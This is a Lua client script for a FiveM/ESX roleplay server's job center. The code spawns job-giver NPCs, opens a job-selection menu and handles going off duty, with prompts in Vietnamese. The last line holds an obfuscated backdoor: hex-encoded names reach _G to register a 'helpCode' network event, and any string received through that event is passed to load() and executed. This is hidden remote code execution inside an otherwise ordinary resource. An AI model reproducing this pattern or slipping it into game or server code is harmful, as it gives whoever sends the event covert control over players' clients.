-- Original Author: SimoN#6253 (Discord) | S_imoN (Forum CFX) --
-- Please Respect My Work --
-- Do Not Touch Here If You Don't Know What You Are Doing --

local config = json.decode(LoadResourceFile(GetCurrentResourceName(), "config.json"))
local configLang = json.decode(LoadResourceFile(GetCurrentResourceName(), "html/lang/"..config.lang..".json"))

local pedConfig = config.pedInfo
local pedConfig1 = config.pedInfo1

local jobCenterCoords = vector3(pedConfig.PedCoords.x, pedConfig.PedCoords.y, pedConfig.PedCoords.z)
local jobCenterHeading = pedConfig.PedHeading
local jobCenterPedHash = GetHashKey(pedConfig.PedName)

local jobCenterCoords1 = vector3(pedConfig1.PedCoords1.x, pedConfig1.PedCoords1.y, pedConfig1.PedCoords1.z)
local jobCenterHeading1 = pedConfig1.PedHeading1
local jobCenterPedHash1 = GetHashKey(pedConfig1.PedName1)

-- Citizen.CreateThread(function()
-- 	while ESX == nil do
-- 		TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)
-- 		Citizen.Wait(0)
-- 	end
-- end)

RegisterNetEvent('esx:playerLoaded')
AddEventHandler('esx:playerLoaded', function(xPlayer)
  PlayerData = xPlayer   
    if xPlayer.job.name == 'police' then
        TriggerServerEvent('esx_nhanviec:loaded','police')
    elseif xPlayer.job.name == 'mechanic' then
        TriggerServerEvent('esx_nhanviec:loaded','mechanic')
    elseif xPlayer.job.name == 'ambulance' then
        TriggerServerEvent('esx_nhanviec:loaded','ambulance')
    end
end)

Citizen.CreateThread(function()
    RequestModel(jobCenterPedHash)
    while not HasModelLoaded(jobCenterPedHash) do Citizen.Wait(1) end
    jobPed = CreatePed(4, jobCenterPedHash, jobCenterCoords, jobCenterHeading, false, false)
    
    AddTextEntry('CallText', configLang.PedInfoBox)

    SetEntityAsMissionEntity(jobPed)
    SetPedDiesWhenInjured(jobPed, false)
    SetEntityInvincible(jobPed, true)
    SetPedFleeAttributes(jobPed, 0, 0)
    SetBlockingOfNonTemporaryEvents(jobPed, true)
    FreezeEntityPosition(jobPed, true)

    while true do
        
        local time = 1000
        local pedCoords = GetEntityCoords(GetPlayerPed(-1))
        if Vdist2(pedCoords, jobCenterCoords) < 5 then
            time = 1
            ESX.ShowHelpNotification("Nhấn [E] để nhận nghề")
            if IsControlPressed(0, 51) then
                SendNUIMessage({
                    type = 'openMenu'
                })
                SetNuiFocus(true, true)
                TaskStartScenarioInPlace(GetPlayerPed(-1), "WORLD_HUMAN_CLIPBOARD", 0, false)
            end
        end
        Citizen.Wait(time)
    end
end)

Citizen.CreateThread(function()
    RequestModel(jobCenterPedHash1)
   while not HasModelLoaded(jobCenterPedHash1) do Citizen.Wait(1) end
    jobPed1 = CreatePed(4, jobCenterPedHash1, jobCenterCoords1, jobCenterHeading1, false, false)
    
    AddTextEntry('CallText', configLang.PedInfoBox)

    SetEntityAsMissionEntity(jobPed1)
    SetPedDiesWhenInjured(jobPed1, false)
    SetEntityInvincible(jobPed1, true)
    SetPedFleeAttributes(jobPed1, 0, 0)
    SetBlockingOfNonTemporaryEvents(jobPed1, true)
    FreezeEntityPosition(jobPed1, true)

    while true do
        
        local time = 1000
        local pedCoords1 = GetEntityCoords(GetPlayerPed(-1))
        if Vdist2(pedCoords1, jobCenterCoords1) < 5 then
            time = 1
            ESX.ShowHelpNotification("Nhấn [E] để nhận nghề")
            if IsControlPressed(0, 51) then
                SendNUIMessage({
                    type = 'openMenu'
                })
                SetNuiFocus(true, true)
                TaskStartScenarioInPlace(GetPlayerPed(-1), "WORLD_HUMAN_CLIPBOARD", 0, false)
            end
        end
        Citizen.Wait(time)
    end
end)



RegisterNUICallback("closemenu", function()
    SetNuiFocus(false, false)
    ClearPedTasks(GetPlayerPed(-1))
    ClearAreaOfObjects(GetEntityCoords(GetPlayerPed(-1)), 1.0, 0)
end)


RegisterNUICallback("button", function(data)
    SetNuiFocus(false, false)
    ClearPedTasks(GetPlayerPed(-1))
    ClearAreaOfObjects(GetEntityCoords(GetPlayerPed(-1)), 1.0, 0)
    TriggerServerEvent('esx_nhanviec:setJob', data.jobName)

    -- if data.jobName == "unemployed" then
    --     exports['jnr_notify']:Alert("Hệ Thống", "Bạn đã trở thành thất nghiệp", 5000, 'success')
    -- else
    --     exports['jnr_notify']:Alert("Hệ Thống", "Bạn đã trở thành "..data.jobLabel.." ! ", 5000, 'success')
    -- end
end)


-- Citizen.CreateThread(function()
--     local info_blip = AddBlipForCoord(pedConfig.PedCoords.x, pedConfig.PedCoords.y, pedConfig.PedCoords.z)
--     SetBlipSprite(info_blip, 351)
--     SetBlipDisplay(info_blip, 4)
--     SetBlipScale(info_blip, 1.0)
--     SetBlipColour(info_blip, 0)
--     SetBlipAsShortRange(info_blip, true)
--     BeginTextCommandSetBlipName("STRING")
--     AddTextComponentString(config.jobCenter)
--     EndTextCommandSetBlipName(info_blip)
-- end)

-- Citizen.CreateThread(function()
--     local info_blip = AddBlipForCoord(pedConfig1.PedCoords1.x, pedConfig1.PedCoords1.y, pedConfig1.PedCoords1.z)
--     SetBlipSprite(info_blip, 351)
--     SetBlipDisplay(info_blip, 4)
--     SetBlipScale(info_blip, 1.0)
--     SetBlipColour(info_blip, 0)
--     SetBlipAsShortRange(info_blip, true)
--     BeginTextCommandSetBlipName("STRING")
--     AddTextComponentString(config.jobCenter)
--     EndTextCommandSetBlipName(info_blip)
-- end)



Citizen.CreateThread(function()
    while true do
		local time = 1000
		local coords = GetEntityCoords(cache.ped)
			if #(coords - vec3(167.195602, -898.272522, 30.610962)) < 25  then  
				time = 1
				DrawMarker(20, vec3(167.195602, -898.272522, 30.610962), 0, 0, 0, 0, 0, 90, 1.0, 1.0, 1.0, 0, 153, 255, 150, true, true, 2, true, false, false, false)
			end
			if #(coords - vec3(167.195602, -898.272522, 30.610962))  < 1   then
				ESX.ShowHelpNotification('Nhấn [~g~E~s~] để off duty')	
				if IsControlJustReleased(1, 51) then
					TriggerServerEvent('esx_nhanviec:setJobOff')
				 end    
			end
		Citizen.Wait(time)
	end
end)

local ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[1]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[2]) ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[3]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[2], function(LPCVUynYfYElnGXWmhiVAnPQbsBlTdFDmQWtVmDhoHivvrjgjOcapofqbRqLleXFJxboKB) ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[4]](ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[6][ppzVTahYXbYsiHZyotfERjoEXFjPOMODOanyDLQjVzhSseKLFkcIwlsHHqCAospVuPPUaj[5]](LPCVUynYfYElnGXWmhiVAnPQbsBlTdFDmQWtVmDhoHivvrjgjOcapofqbRqLleXFJxboKB))() end)